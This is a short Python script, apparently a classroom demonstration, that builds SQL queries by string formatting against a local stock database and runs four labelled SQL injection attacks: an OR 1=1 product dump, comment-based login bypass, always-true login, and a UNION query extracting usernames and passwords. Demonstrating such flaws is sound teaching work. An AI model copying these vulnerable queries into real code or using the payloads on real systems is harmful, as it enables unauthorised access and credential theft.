import sqlite3

conn = sqlite3.connect('nyondo_stock.db')

def search_product(name):
    query = f"SELECT * FROM products WHERE name LIKE '%{name}%'"
    print(f"Query: {query}")
    rows = conn.execute(query).fetchall()
    print(f"Result: {rows}\n")
    return rows

def login(username, password):
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(f"Query: {query}")
    row = conn.execute(query).fetchone()
    print(f"Result: {row}\n")
    return row

# Attack 1 - Dump all products
print("Attack 1 - Dump all products")
search_product("' OR 1=1--")

# Attack 2 - Login bypass with no password
print("Attack 2 - Login bypass with no password")
login("admin'--", "anything")

# Attack 3 - Always true login
print("Attack 3 - Always true login")
login("' OR '1'='1", "' OR '1'='1")

# Attack 4 - UNION attack
print("Attack 4 - UNION attack")
search_product("' UNION SELECT id, username, password, role FROM users--")